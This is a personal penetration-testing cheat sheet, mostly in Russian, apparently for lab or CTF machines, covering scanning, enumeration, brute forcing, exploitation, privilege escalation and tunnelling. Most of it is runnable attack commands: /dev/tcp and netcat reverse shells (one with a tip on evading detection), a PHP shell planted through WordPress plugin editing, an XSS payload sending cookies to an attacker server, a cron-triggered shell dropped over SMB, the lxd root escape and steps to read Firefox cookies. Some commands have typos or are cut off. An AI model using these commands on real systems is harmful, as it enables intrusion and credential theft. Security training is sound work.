https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
https://gtfobins.github.io/gtfobins/perl
https://www.sjoerdlangkemper.nl/2021/04/04/remote-code-execution-through-unsafe-unserialize/
https://github.com/karthikuj/cve-2022-42889-text4shell-docker


===== PENTEST =====
Цель — Получить доступ к внутренней сети и хостам, которые находятся в ней.
Подход: Network Scanning -> Enumeration -> Exploitation -> Privilege Escalation


===== Network Scanning =====
###ping scan
netdiscover
nmap
masscan
nmap -sn 127.0.0.1/0 
2 -oX test.xml (конвертировать xsltproc test.xml -o test.html)
masscan -p0 --rate-10000 -e <интерфейс> 172.16.2.0/16
arp-scan -I eth1 --localnet

###port scan 
nmap -sV -sS -A -p- 127.0.0.1 --script vuln # all tcp ports
nmap -sV -sS -A 127.0.0.1 --script vuln #tcp
nmap -sV -sS -A -sU 127.0.0.1 # udp ports


===== Enumeration =====
###Запуск сканеров веб уязвимостей (Пример: OWASP ZAP)
###dirb директорий на сайте
owaspzap нет из коробки
#apt install seclists установить словать для перебора
dirb http://host -X .php,.zip
sudo dirsearch -r -u http://192.168.1.2 -e php,txt,bak -w /usr/share/dirb/wordlists/big.txt -f -x 301,403
gobuster dir -u <URL> -w <wordlist-file>
gobuster dir -u http://192.168.108.131 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php //sometimes it works better
wfuzz -c -z file,<wordlist-file> --hc 404 <URL>/FUZZ
nikto -h <host>
enum4linux ip перечисление папок если открыт smbclient
smbclient -L ip проверить все доступные папки
ftp <host> / user:anonymous password:anonymous

cat /etc/passwd | grep home #user enumeration

wpscan --url http(s)://your-domain.com --enumerate p //

detected common_names and sans (from certs e.g.) must be included in /etc/hosts;
dirb; gobuster; dirsearch must be used for each detected server name

https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb //useful link


===== Brutforce password =====
#Если находим архив пробуем перебрать пароли к нему
zip2john <file> > hash - достать хеш пароля
john <hash> --wordlists=/usr/share/wordlists/rockyou.txt
fcrackzip -D -p /usr/share/wordlists/rockyou.txt - u 'путь к архиву в кавычках'
hydra -L <путь к списку пользователей> -P <путь к списку паролей> <URL> -s 8080 -t 64 http-get /<путь к защищенному ресурсу> #basic auth brute (если на сайте базовая авторизация)

curl -k 'imaps://1.2.3.4/' --user user:pass
curl -k 'imaps://1.2.3.4/INBOX?ALL' --user user:pass
curl -k 'imaps://1.2.3.4/Drafts?TEXT password' --user user:pass

crackmapexec ssh ip.txt -u user.txt -p passwd.txt #ssh brutforce for several hosts

###перебор суб доменов и получение информации о A записях, если развернут dns
dig @127.0.0.1 greenoptic.vm axfr
gobuster vhost -u test.dns -w /usr/share/wordlists/dirb/big.txt

https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force //useful link for all types of password


===== ActiveDirectory =====
nmap --script smb-enum-users.nse -p445 <host> //users enumeration using SAMR (through RPC)
sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host>


---===== Metasploit =====
exploitdb
msfconsole
search <VULNNAME or soft Version> указываем ПО и версию для чего ищем экслойт
searchsplot ... | grep ... | ... - search for suitable exploit
locate <path> - get an absolute path to exploit
locate linux_x86-64/local/40049.c //example of the previous command
use <number exploit>
show options (show advanced, set verbose true для отладки экслойта)
exploit для запуска экслойта, если все хорошо должнгы получить meterpreter shells
shell вводим в ссесии метепретер
python3  -c 'import pty;pty.spawn("/bin/bash")'
/etc/passwd etc/shadow etc/group
sudo -l показывает файлы которые можео запускать без root привилегий
find / -perm -u=s --file f 2>dev/null найти файлы другие
getcup -r / 2>dev/null

---
exploitdb 

###anon access
smbclient -L \\host # 
ftp
ssh, welcome message


===== Exploitation =====
msfconsole #show options, show advanced
msfvenom -p [пейлоад] [параметры пейлоада] -f [формат] -o [итоговый файл] #создание полезной нагрузки https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
exploit/multi/handler #необходио включить слушателя с параметрами как в msfvenom
exploitdb #использовать эксплоиты из exploitdb
python3 -c 'import pty;pty.spawn("/bin/bash")'

Open reverse-shell
/bin/bash -i >& /dev/tcp/<ip-server>/<port-server> 0>&1 //in some cases ip-server mus be transformed to decimal value to avoid net connection detection

system(/bin/bash -i >& /dev/tcp/<ip-server>/<port-server> 0>&1) #insert into existing php web page e.g. WordPress->Tools->EditPlugins
nc -nvlp 4444 //command for listening on port
nc -lvvnp 4444 //alternative command call

XSS # e.g. insert as a comment and then send the link to admin, then wait connection to your own webserver
<script>
var req = new XMLHttpRequest();
var url = 'http://192.168.56.2/' + document.cookie;
req.open(“GET”, url);
req.send();
</script> 

===== Privilege Escalation =====
sudo -l #Команда sudo -l используется для проверки привилегий пользователя в системе, особенно в контексте команды sudo (Superuser do). При выполнении команды sudo -l пользователь может узнать список команд или правил, которые он может выполнять с привилегиями суперпользователя.
find / -perm -u=s -type f 2>/dev/null # поиск по файловой системе файлов, которые созданы рутом, и у нас есть привилегии на запуск
getcap -r / 2>/dev/null
#getcap - это команда для получения информации об атрибутах capabilities файлов.
#-r / указывает на рекурсивный поиск файлов по всей файловой системе, начиная с корневого каталога ("/").
#2>/dev/null используется для перенаправления сообщений об ошибках (stderr) в никуда (устройство /dev/null), чтобы избежать вывода ошибок в консоль.

getting access to cookies file of Mozilla Firefox browser in Linux
cd ~/.mozilla/firefoxusing
cat profiles.ini // get a name of profile name
cd <profile.name> // the ending of the file should name like default or default-esr
sqlite3 cookies.sqlite
SELE

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh //Linpeas.sh [Executing Linux Exploit Suggester] - section with possible exploits
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ # paths to privileges escalation 

Скачиваем утилиту для просмотра процессов на сервер:
https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s
sudo pspy64s #process detection

### Повышение через lxd контейнер
--- Выолняем на своей машине ---
git clone https://github.com/saghul/lxd-alpine-builder.git 
cd lxd-alpine-builder
./build-alpine # собираем алпайн контейнер
python2 -m SimpleHTTPServer # запускаем в папке где мы создали контейнер http сервер
--- На уязвимом хосте ---
wget http://192.168.1.107:8000/alpine-v3.10-x86_64-20191019_0712.tar.gz
lxc image import ./alpine-v3.10-x86_64-20191019_0712.tar.gz --alias myimage # импортим образ
lxc image list # проверяем что импорт прошел успешно 
lxc init myimage ignite -c security.privileged=true # инициализирем контейнер
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true # монтируем / как диск 
lxc start ignite # запускаем контейнер
lxc exec ignite /bin/sh # заходим в контейнер, переходим в папку где примонтирован /


####ТУНЕЛИ####
Создание SSH туннеля: ssh -D <локальный порт> -p <порт> <пользователь>@<удаленный хост>
Прямой туннель: ssh -L <локальный порт>:<удаленный хост>:<удаленный порт> <пользователь>@<удаленный хост>
Обратный туннель: ssh -R <удаленный порт>:<локальный хост>:<локальный порт> <пользователь>@<удаленный хост>
Прямой туннель: socat TCP-LISTEN:<локальный порт>,fork TCP:<удаленный хост>:<удаленный порт>
Обратный туннель: socat TCP-LISTEN:<удаленный порт>,fork TCP:<локальный хост>:<локальный порт>
Прямой туннель: nc -l -p <локальный порт> -c 'nc <удаленный хост> <удаленный порт>'
Обратный туннель: nc -l -p <удаленный порт> -c 'nc <локальный хост> <локальный порт>'


#######Также можно использовать скрипт для повышения привилегий скачать тут
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite, 
для этого поднимем на своей машине веб
python3 -m http.server 80
На целевой машине прописываем wget http://айпи своего хоста/linpeas.sh
chmod +x linpeas.sh
sh linpeas.sh
После выполнения скрипт подсветит красным текстом с желтым фоном возможные векторы атаки

####Если 445 порт SMB, то
smbmap -H 192.168.1.165 (айпи адрес машины)
Если есть доступная папка, то
smbclient //192.168.1.165/ITDEPT (имя папки)
ls 
можем записать в файл команду на reverse shell
echo "nc -e /bin/bash 192.168.1.68 9001" > web-control  (ip своего хоста)
Загружаем полученный файл через smb командой put, командой get можно забрать файл себе с сервера
put web-control (web-control называем его так, в логах видно что файл с таким именем запускается кроном)
На своей машине прописываем
nc -lnvp 9001
Ждем пока выполнится кронтабовская задача… и у нас есть шелл, пользователя www-data. Для удобства работы с шеллом сделаем его интерактивным с помощью питона
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat .bash_history посмотреть какие команды вводились с консоли
sudo sudo -u root -i '/bin/bash' если доступно выполнение sudo, можно повысить привилегии
Другая тулза для smb
enum4linux -a 192.168.1.106  возможно покажет локального пользователя, если да, то 
Будем брутить ftp hydra -l matt -p /usr/share/wordlists/rockyou.txt -t 64 ftp://192.168.1.106 -v
https://habr.com/ru/companies/pm/articles/533010/

sudo sqlmap -u 'http://192.168.1.44:8008/unisxcudkqjydw/vulnbank/client/login.php' --data='username=admin&password=admin' --random-agent --level=5 --risk=3

gidra -l joker -P <путь к списку паролей> <URL> -s 8080 -t 64 http-get /
dirb url:port -u login:password


//Apache
phpinfo.php
robots.txt
